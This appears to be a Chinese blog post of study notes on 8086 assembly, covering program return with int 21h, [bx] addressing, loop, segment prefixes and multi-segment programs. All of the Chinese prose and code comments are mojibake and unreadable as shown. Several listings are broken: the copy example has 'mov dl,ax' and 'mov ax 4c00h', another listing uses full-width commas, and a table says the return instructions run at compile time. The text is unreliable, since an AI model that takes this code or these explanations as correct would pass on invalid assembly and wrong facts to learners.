title="ç¨‹åºè¿”å›"></a>ç¨‹åºè¿”å›</h4><p>æˆ‘ä»¬çš„ç¨‹åºæœ€å…ˆä»¥æ±‡ç¼–æŒ‡ä»¤çš„å½¢å¼å­˜åœ¨æºç¨‹åºä¸­ï¼Œç»ç¼–è¯‘ã€è¿æ¥åè½¬å˜ä¸ºæœºå™¨ç ï¼Œå­˜å‚¨åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆå®ƒæ€ä¹ˆå¾—åˆ°è¿è¡Œå‘¢ï¼Ÿ</p><ul><li>DOSä¸­çš„ç¨‹åºè¿è¡Œ</li></ul><p>DOSæ˜¯ä¸€ä¸ªå•ä»»åŠ¡æ“ä½œç³»ç»Ÿã€‚ä¸€ä¸ªç¨‹åºP2åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œåˆ™å¿…é¡»æœ‰ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åºP1ï¼Œå°†P2ä»å¯æ‰§è¡Œæ–‡ä»¶ä¸­åŠ è½½å…¥å†…å­˜åï¼Œå°†CPUçš„æ§åˆ¶æƒäº¤ç»™P2ï¼ŒP2æ‰èƒ½å¾—ä»¥è¿è¡Œã€‚P2å¼€å§‹è¿è¡Œåï¼ŒP1æš‚åœè¿è¡Œã€‚å½“P2è¿è¡Œå®Œæ¯•åï¼Œåº”è¯¥å°†CPUçš„æ§åˆ¶æƒäº¤æ¢ç»™å®ƒä½¿å®ƒå¾—ä»¥è¿è¡Œçš„ç¨‹åºP1ï¼Œæ­¤åP1ç»§ç»­è¿è¡Œã€‚</p><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“ï¼Œä¸€ä¸ªç¨‹åºç»“æŸåï¼Œå°†CPUçš„æ§åˆ¶æƒäº¤è¿˜ç»™ä½¿ä»–å¾—ä»¥è¿è¡Œçš„ç¨‹åºï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªè¿‡ç¨‹ä¸ºï¼šç¨‹åºè¿”å›ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;åœ¨ç¨‹åºçš„æœ«å°¾å¤©ç•Œè¿”å›çš„ç¨‹åºæ®µã€‚</span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H  </span><br><span class="line">;è¿™ä¸¤æ¡æŒ‡ä»¤æ‰€å®ç°çš„åŠŸèƒ½å°±æ˜¯ç¨‹åºè¿”å›</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;æ®µç»“æŸã€ç¨‹åºç»“æŸã€ç¨‹åºè¿”å›&#x3D;&#x3D;</p><table><thead><tr><th align="center">ç›®çš„</th><th align="center">ç›¸å…³æŒ‡ä»¤</th><th align="center">æŒ‡ä»¤æ€§è´¨</th><th align="center">æ‰§è¡Œæ‰§è¡Œè€…</th></tr></thead><tbody><tr><td align="center">é€šçŸ¥ç¼–è¯‘å™¨ä¸€ä¸ªæ®µç»“æŸ</td><td align="center">æ®µå ends</td><td align="center">ä¼ªæŒ‡ä»¤</td><td align="center">ç¼–è¯‘æ—¶ï¼Œç”±ç¼–è¯‘å™¨æ‰§è¡Œ</td></tr><tr><td align="center">é€šçŸ¥ç¼–è¯‘å™¨ç¨‹åºç»“æŸ</td><td align="center">end</td><td align="center">ä¼ªæŒ‡ä»¤</td><td align="center">ç¼–è¯‘æ—¶ï¼Œç”±ç¼–è¯‘å™¨æ‰§è¡Œ</td></tr><tr><td align="center">ç¨‹åºè¿”å›</td><td align="center">mov ax,4c00H       int 21H</td><td align="center">æ±‡ç¼–æŒ‡ä»¤</td><td align="center">ç¼–è¯‘æ—¶ï¼Œç”±CPUæ‰§è¡Œ</td></tr></tbody></table><h1 id="BX-å’ŒloopæŒ‡ä»¤"><a href="#BX-å’ŒloopæŒ‡ä»¤" class="headerlink" title="[BX]å’ŒloopæŒ‡ä»¤"></a>[BX]å’ŒloopæŒ‡ä»¤</h1><h3 id="bx"><a href="#bx" class="headerlink" title="[bx]"></a>[bx]</h3><p><strong>[bx]</strong> çš„å«ä¹‰ï¼š[bx]å’Œ[0]ç±»ä¼¼ï¼ŒåŒæ ·è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒï¼Œå®ƒçš„åç§»åœ°å€åœ¨bxä¸­ï¼Œæ®µåœ°å€é»˜è®¤åœ¨dsä¸­</p><p><code>mov ax, [bx]</code></p><p>â€‹åŠŸèƒ½ï¼šbxä¸­å­˜æ”¾çš„æ•°æ®ä½œä¸ºä¸€ä¸ªåç§»åœ°å€EAï¼Œæ®µåœ°å€SAé»˜è®¤åœ¨dsä¸­ï¼Œå°†SA:EAå¤„çš„æ•°æ®é€å…¥axä¸­ã€‚å³<code>(ax) =((ds)*16+(bx)) </code></p><p>æ³¨ï¼šåœ¨ä»¥åçš„è¯¾ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ªæè¿°æ€§çš„ç¬¦å·â€( )â€æ¥è¡¨ç¤ºä¸€ä¸ªå¯„å­˜å™¨æˆ–ä¸€ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹ã€‚æ¯”å¦‚ï¼š(ax)è¡¨ç¤ºaxä¸­çš„å†…å®¹ã€(20000H)è¡¨ç¤º2000Hä¸­çš„å†…å®¹ï¼›</p><h3 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h3><p>è‹±æ–‡å•è¯â€™loopâ€™æœ‰å¾ªç¯çš„å«ä¹‰ï¼Œæ˜¾ç„¶è¿™ä¸ªæŒ‡ä»¤å’Œå¾ªç¯æœ‰å…³ã€‚</p><p>loopæŒ‡ä»¤çš„æ ¼å¼æ˜¯ï¼š<code>loop æ ‡å·</code>ï¼ŒCPUæ‰§è¡ŒloopæŒ‡ä»¤çš„æ—¶å€™ï¼Œè¦è¿›è¡Œä¸¤æ­¥æ“ä½œ</p><ul><li>(cx) &#x3D; (cx) - 1;</li><li>åˆ¤æ–­ cx ä¸­çš„å€¼ï¼Œä¸ä¸ºé›¶åˆ™è½¬è‡³æ ‡å·å¤„æ‰§è¡Œç¨‹åºï¼Œå¦‚æœä¸ºé›¶åˆ™å‘ä¸‹æ‰§è¡Œã€‚</li></ul><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œcxä¸­çš„å€¼å½±å“ç€loopæŒ‡ä»¤çš„æ‰§è¡Œç»“æœã€‚é€šå¸¸æˆ‘ä»¬ç”¨loopæŒ‡ä»¤æ¥å®ç°å¾ªç¯åŠŸèƒ½ï¼Œcxä¸­å­˜æ”¾å¾ªç¯æ¬¡æ•°ã€‚</p><h4 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h4><p>ä»»åŠ¡ï¼šç¼–ç¨‹è®¡ç®—2^12ï¼Œç»“æœå­˜æ”¾åœ¨axä¸­ã€‚</p><p>åˆ†æï¼š</p><p>N^2å¯ä»¥ç”¨N+Nè¡¨ç¤ºï¼Œè®¾(ax) &#x3D; 2,(ax) &#x3D; (ax)+(ax)ï¼Œ</p><p>2^4å¯ä»¥ç”¨<code>2*2*2*2</code>è¡¨ç¤ºï¼Œä¸Šä¸€æ­¥æ‰§è¡Œå¾—åˆ°çš„(ax)å†æ¬¡æ‰§è¡Œä¸¤æ¬¡(ax) &#x3D; (ax) + (ax)</p><p>ä¹Ÿå°±æ˜¯2^12å°±æ˜¯2ä¹˜11æ¬¡2ï¼Œæ€»å…±æ‰§è¡Œ11æ¬¡(ax)&#x3D;(ax)+(ax);</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment </span><br><span class="line">mov ax,2</span><br><span class="line"></span><br><span class="line">mov cx,11</span><br><span class="line"> s: add ax,ax</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00H</span><br><span class="line">int 21H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><ul><li>ç¨‹åºä¸­æ ‡å·<code>s</code>å®é™…ä¸Šæ ‡ç¤ºäº†ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€ç”±ä¸€æ¡æŒ‡ä»¤ï¼šadd ax,ax;</li><li>loop s ç¨‹åºåœ¨æ‰§è¡Œè¿™æ¡æŒ‡ä»¤æ—¶ï¼Œå…ˆcx-1ï¼Œä¸ä¸ºé›¶ï¼Œæ‰§è¡Œæ ‡å·çš„æŒ‡ä»¤ï¼Œå†ç»§ç»­cx-1ï¼Œä¸€ç›´åˆ°cx&#x3D;0ï¼Œæ€»å…±å¾ªç¯äº†10æ¬¡ï¼Œä½†æ˜¯åˆšå¼€å§‹æ‰§è¡Œäº†ä¸€æ¬¡ï¼Œæ•…æ€»å…±æ‰§è¡Œäº†11æ¬¡ï¼Œæ­£å¥½ç­‰äºcx</li></ul><h3 id="loopå’Œ-bx-çš„è”åˆ"><a href="#loopå’Œ-bx-çš„è”åˆ" class="headerlink" title="loopå’Œ[bx]çš„è”åˆ"></a>loopå’Œ[bx]çš„è”åˆ</h3><p>é—®é¢˜ï¼šè®¡ç®—ffff:0~ffff:bå•å…ƒä¸­çš„æ•°æ®å’Œï¼Œç»“æœå­˜å‚¨åœ¨dxä¸­</p><p>åˆ†æï¼š</p><ul><li>ffff:0<del>ffff:bä¸­çš„æ•°æ®éƒ½æ˜¯8ä½çš„ï¼Œä¸èƒ½ç›´æ¥åŠ åˆ°å¯„å­˜å™¨dxä¸­ï¼Œè€Œå…ˆç´¯åŠ åˆ°dlä¸­è®¾ç½®(dh)&#x3D;0ä¹Ÿä¸è¡Œï¼Œffff:0</del>ffff:bæ•°æ®èŒƒå›´åœ¨0~255ï¼Œ12ä¸ª8ä½æ•°æ®ç›¸åŠ å¯èƒ½å¯¼è‡´è¿›ä½ä¸¢å¤±</li><li>ç›®å‰çš„æ–¹æ³•æ˜¯ç”¨ä¸€ä¸ª16ä½çš„å¯„å­˜å™¨æ¥åšä¸­ä»‹ã€‚å°†å†…å­˜å•å…ƒä¸­çš„8ä½æ•°æ®èµ‹å€¼åˆ°16ä½å¯„å­˜å™¨axä¸­ï¼Œå†å°†axä¸­çš„æ•°æ®åŠ åˆ°dxä¸­ï¼Œä»è€Œä½¿è¿™ä¸¤ç§è¿ç®—å¯¹è±¡çš„ç±»å‹åŒ¹é…ä¸”ä¸ä¼šå‘ç”Ÿè¶Šç•Œ</li><li>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯æ‰€æœ‰æ•°æ®å’ŒåŠ èµ·æ¥æ„æˆå¾ªç¯ï¼Œå¯ä»¥ä½¿ç”¨loopæ¥ç®€åŒ–ç¨‹åº</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">mov ax,0ffffh ;åœ¨æ±‡ç¼–æºç¨‹åºä¸­ï¼Œæ•°æ®ä¸èƒ½ä»¥å­—æ¯å¼€å¤´ï¼Œæ‰€ä»¥è¦åœ¨å‰é¢åŠ 0</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0    ;åˆå§‹åŒ–ds:bxæŒ‡å‘ffff:0</span><br><span class="line">mov dx,0    ;åˆå§‹åŒ–ç´¯åŠ å¯„å­˜å™¨dx,(dx) = 0</span><br><span class="line">mov cx,12   ;åˆå§‹åŒ–å¾ªç¯è®¡æ•°å¯„å­˜å™¨cx,(cx) = 12</span><br><span class="line"> s: mov al,[bx]</span><br><span class="line">mov ah,0</span><br><span class="line">add dx,ax   ;é—´æ¥å‘dxä¸­åŠ ä¸Š((ds)*16+(bx))å•å…ƒçš„æ•°å€¼</span><br><span class="line">inc bx      ;ds:bxæŒ‡å‘ä¸‹ä¸€ä¸ªå•å…ƒ</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="æ®µå‰ç¼€"><a href="#æ®µå‰ç¼€" class="headerlink" title="æ®µå‰ç¼€"></a>æ®µå‰ç¼€</h3><p>æŒ‡ä»¤<code>mov ax,[bx]</code>ä¸­ï¼Œå†…å­˜å•å…ƒçš„åç§»åœ°å€ç”±bxç»™å‡ºï¼Œè€Œæ®µåœ°å€é»˜è®¤åœ¨dsä¸­ã€‚æˆ‘ä»¬å¯ä»¥åœ¨è®¿é—®å†…å­˜å•å…ƒçš„æŒ‡ä»¤ä¸­æ˜¾å¼çš„ç»™å‡ºå†…å­˜å•å…ƒçš„æ®µåœ°å€æ‰€åœ¨çš„æ®µå¯„å­˜å™¨ã€‚æ¯”å¦‚ï¼š</p><ul><li><p><code>mov ax,ds:[bx]</code></p><p>å°†ä¸€ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹é€å…¥axï¼Œè¿™ä¸ªå†…å­˜å•å…ƒçš„é•¿åº¦ä¸º2å­—èŠ‚ï¼Œå­˜æ”¾ä¸€ä¸ªå­—ï¼Œåç§»åœ°å€åœ¨bxä¸­ï¼Œæ®µåœ°å€åœ¨dsä¸­ã€‚</p></li></ul><p>ç±»ä¼¼çš„è¿˜æœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax, ds:[bx]</span><br><span class="line">mov ax, cs:[bx]</span><br><span class="line">mov ax, ss:[bx]</span><br><span class="line">mov ax, es:[bx]</span><br><span class="line">mov ax, ss:[0]</span><br><span class="line">mov ax, cs:[0]</span><br></pre></td></tr></table></figure><p>è¿™äº›å‡ºç°åœ¨è®¿é—®å†…å­˜å•å…ƒçš„æŒ‡ä»¤ä¸­ï¼Œç”¨äºæ˜¾ç¤ºçš„æŒ‡æ˜å†…å­˜å•å…ƒçš„æ®µåœ°å€çš„â€dsâ€,â€csâ€,â€ssâ€,â€esâ€ï¼Œåœ¨æ±‡ç¼–è¯­è¨€ä¸­ç§°ä¸ºæ®µå‰ç¼€ã€‚</p><h4 id="æ®µå‰ç¼€çš„ä½¿ç”¨"><a href="#æ®µå‰ç¼€çš„ä½¿ç”¨" class="headerlink" title="æ®µå‰ç¼€çš„ä½¿ç”¨"></a>æ®µå‰ç¼€çš„ä½¿ç”¨</h4><p>é—®é¢˜ï¼šå°†å†…å­˜<code>ffff:0 ~ ffff:b</code>å•å…ƒä¸­çš„æ•°æ®å¤åˆ¶åˆ°<code>0:200 ~ 0:20b</code>å•å…ƒä¸­ã€‚</p><p>åˆ†æï¼š</p><ul><li>å¤åˆ¶çš„è¿‡ç¨‹åº”ç”¨å¾ªç¯å®ç°<ul><li>x&#x3D;0</li><li>å¾ªç¯åäºŒæ¬¡ï¼š<ul><li>å°†ffff:xä¸­çš„æ•°æ®é€å…¥0020:X(éœ€è¦ç”¨ä¸€ä¸ªå¯„å­˜å™¨ä¸­è½¬)</li><li>X&#x3D;X+1</li></ul></li></ul></li><li>åœ¨å¾ªç¯ä¸­ï¼ŒXæ˜¯å˜é‡ï¼Œæˆ‘ä»¬å“Ÿbxå­˜æ”¾</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov bx,0    ;(bx)=0,åç§»åœ°å€ä»0å¼€å§‹</span><br><span class="line">mov cx,12   ;å¾ªç¯12æ¬¡</span><br><span class="line"></span><br><span class="line">s:  mov ax,0ffffh</span><br><span class="line">mov ds,ax   ;(ds)=0fffffh</span><br><span class="line">mov dl,ax   ;(dl)=((ds)*16+(bx)),å°†ffff:bxä¸­çš„æ•°æ®ä¼ å…¥dl</span><br><span class="line"></span><br><span class="line">mov ax,0020H</span><br><span class="line">mov ds,ax   ;(ds)=0020H</span><br><span class="line">mov [bx],dl ;((ds)*16+(bx))=(dl),å°†dlçš„æ•°æ®ä¼ å…¥0020:bx</span><br><span class="line"></span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax 4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h1 id="åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº"><a href="#åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº" class="headerlink" title="åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº"></a>åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº</h1><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><ul><li>ç¨‹åºå–å¾—æ‰€éœ€ç©ºé—´çš„æ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€æ˜¯åœ¨åŠ è½½ç¨‹åºçš„æ—¶å€™ä¸ºç¨‹åºåˆ†é…ï¼Œå†å°±æ˜¯ç¨‹åºåœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­å‘ç³»ç»Ÿç”³è¯·ã€‚è¿™é‡Œæˆ‘ä»¬ä¸»è¦ç ”ç©¶ç¬¬ä¸€ç§æ–¹å¼ï¼ŒåŠ è½½ç¨‹åºçš„æ—¶å€™ä¸ºç¨‹åºåˆ†é…ç©ºé—´</li><li>æˆ‘ä»¬è‹¥è¦ä¸€ä¸ªç¨‹åºåœ¨è¢«åŠ è½½çš„æ—¶å€™å–å¾—æ‰€éœ€çš„ç©ºé—´ï¼Œåˆ™å¿…é¡»è¦åœ¨æºç¨‹åºä¸­ä½œå‡ºè¯´æ˜ã€‚æˆ‘ä»¬é€šè¿‡æºç¨‹åºä¸­å®šä¹‰æ®µæ¥è¿›è¡Œå†…å­˜ç©ºé—´çš„è·å–ã€‚</li></ul><p>ç¨‹åºä¸­å¯¹æ®µåçš„å¼•ç”¨ï¼Œè¢«ç¼–è¯‘å™¨å¤„ç†ä¸ºä¸€ä¸ªè¡¨ç¤ºæ®µåœ°å€çš„æ•°å€¼ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax, data</span><br><span class="line">mov ds, ax</span><br><span class="line">mov bx, ds:[6]</span><br></pre></td></tr></table></figure><h3 id="åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®"><a href="#åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®" class="headerlink" title="åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®"></a>åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®</h3><h4 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h4><p>è®¡ç®—8ä¸ªæ•°æ®çš„å’Œï¼Œç»“æœå­˜å‚¨åœ¨AXå¯„å­˜å™¨ä¸­ã€‚</p><h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">;è®¡ç®— 8 ä¸ªæ•°æ®çš„å’Œå­˜åˆ° ax å¯„å­˜å™¨</span><br><span class="line">assume cs:code </span><br><span class="line"></span><br><span class="line">code segment </span><br><span class="line"></span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h ;define word å®šä¹‰8ä¸ªå­—å½¢æ•°æ®</span><br><span class="line">                                                   ;æ‰€å çš„å†…å­˜ç©ºé—´å¤§å°ä¸º16ä¸ªå­—èŠ‚</span><br><span class="line"></span><br><span class="line">start:mov bx, 0  ;æ ‡å·startã€‚å‘Šè¯‰CPUä»è¿™é‡Œå¼€å§‹ï¼Œå¦åˆ™ä¸Šé¢çš„dwå­˜çš„æ•°æ®ä¼šè¢«å½“åšä»£ç </span><br><span class="line">mov ax, 0  </span><br><span class="line"></span><br><span class="line">mov cx, 8</span><br><span class="line">s:add ax, cs:[bx]</span><br><span class="line">add bx, 2</span><br><span class="line">loop s </span><br><span class="line"></span><br><span class="line">mov ax, 4c00h </span><br><span class="line">int 21h </span><br><span class="line">code ends</span><br><span class="line">end start    ;endé™¤äº†é€šçŸ¥ç¼–è¯‘å™¨ç¨‹åºç»“æŸå¤–ï¼Œè¿˜å¯ä»¥é€šçŸ¥ç¼–è¯‘å™¨ç¨‹åºçš„å…¥å£åœ¨ä»€ä¹ˆåœ°æ–¹</span><br><span class="line">      ;ç”¨endæŒ‡ä»¤æŒ‡æ˜äº†ç¨‹åºçš„å…¥å£åœ¨æ ‡å·startå¤„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œâ€œmov bxï¼Œ0â€æ˜¯ç¨‹åºçš„ç¬¬ä¸€æ¡æŒ‡ä»¤ã€‚</span><br></pre></td></tr></table></figure><h3 id="åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ"><a href="#åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ" class="headerlink" title="åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ"></a>åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">;åˆ©ç”¨æ ˆï¼Œå°†ç¨‹åºä¸­å®šä¹‰çš„æ•°æ®é€†åºå­˜æ”¾ã€‚</span><br><span class="line">assume cs:codesg </span><br><span class="line"></span><br><span class="line">codesg segment </span><br><span class="line">dw 0123hï¼Œ0456hï¼Œ0789hï¼Œ0abchï¼Œ0defhï¼Œ0fedhï¼Œ0cbahï¼Œ0987h ; 0-15å•å…ƒ</span><br><span class="line">dw 0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0ï¼Œ0 ; 16-47å•å…ƒä½œä¸ºæ ˆä½¿ç”¨</span><br><span class="line"></span><br><span class="line">start:mov ax, cs </span><br><span class="line">mov ss, ax </span><br><span class="line">mov sp, 30h ;å°†è®¾ç½®æ ˆé¡¶ss:spæŒ‡å‘æ ˆåº•cs:30ã€‚   30h = 48d</span><br><span class="line">mov bx, 0</span><br><span class="line"></span><br><span class="line">mov cx, 8</span><br><span class="line">s:push cs:[bx]</span><br><span class="line">add bx, 2</span><br><span class="line">loop s    ;ä»¥ä¸Šå°†ä»£ç æ®µ0~15å•å…ƒä¸­çš„8ä¸ªå­—å‹æ•°æ®ä¾æ¬¡å…¥æ ˆ</span><br><span class="line"></span><br><span class="line">mov bx, 0</span><br><span class="line"></span><br><span class="line">mov cx, 8</span><br><span class="line">s0:pop cs:[bx]</span><br><span class="line">add bxï¼Œ2</span><br><span class="line">loop s0   ;ä»¥ä¸Šä¾æ¬¡å‡ºæ ˆ8ä¸ªå­—å‹æ•°æ®åˆ°ä»£ç æ®µ0~15å•å…ƒä¸­</span><br><span class="line"></span><br><span class="line">mov axï¼Œ4c00h </span><br><span class="line">int 21h </span><br><span class="line">codesg ends </span><br><span class="line">end start;æŒ‡æ˜ç¨‹åºçš„å…¥å£åœ¨startå¤„</span><br></pre></td></tr></table></figure><h3 id="å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ"><a href="#å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ" class="headerlink" title="å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ"></a>å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack    ;å®šä¹‰ä¸‰ä¸ªæ®µ</span><br><span class="line"></span><br><span class="line">data segment </span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h ;0-15å•å…ƒ</span><br><span class="line">data ends </span><br><span class="line"></span><br><span class="line">stack segment </span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 ;0-31å•å…ƒ</span><br><span class="line">stack ends </span><br><span class="line"></span><br><span class="line">code segment </span><br><span class="line">start:mov ax, stack;å°†åç§°ä¸ºâ€œstackâ€çš„æ®µçš„æ®µåœ°å€é€å…¥ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov sp, 20h  ;è®¾ç½®æ ˆé¡¶ss:spæŒ‡å‘stack:20ã€‚ 20h = 32d</span><br><span class="line"></span><br><span class="line">mov ax, data ;å°†åç§°ä¸ºâ€œdataâ€çš„æ®µçš„æ®µåœ°å€é€å…¥ax</span><br><span class="line">mov ds, ax   ;dsæŒ‡å‘dataæ®µ</span><br><span class="line"></span><br><span class="line">mov bx, 0    ;ds:bxæŒ‡å‘dataæ®µä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒ</span><br><span class="line"></span><br><span class="line">mov cx, 8</span><br><span class="line">s:    push [bx]</span><br><span class="line">add bx, 2</span><br><span class="line">loop s       ;ä»¥ä¸Šå°†dataæ®µä¸­çš„0~15å•å…ƒä¸­çš„8ä¸ªå­—å‹æ•°æ®ä¾æ¬¡å…¥æ ˆ</span><br><span class="line"></span><br><span class="line">mov bx, 0</span><br><span class="line"></span><br><span class="line">mov cx, 8</span><br><span class="line">s0:pop [bx]</span><br><span class="line">add bx, 2</span><br><span class="line">loop s0      ;ä»¥ä¸Šä¾æ¬¡å‡ºæ ˆ8ä¸ªå­—å‹æ•°æ®åˆ°dataæ®µçš„0~15å•å…ƒä¸­</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h </span><br><span class="line">int 21h </span><br><span class="line">code ends</span><br><span class="line">end start</span><br><span class="line">;â€œend startâ€è¯´æ˜äº†ç¨‹åºçš„å…¥å£ï¼Œè¿™ä¸ªå…¥å£å°†è¢«å†™å…¥å¯æ‰§è¡Œæ–‡ä»¶çš„æè¿°ä¿¡æ¯ï¼Œ</span><br><span class="line">;å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¨‹åºè¢«åŠ 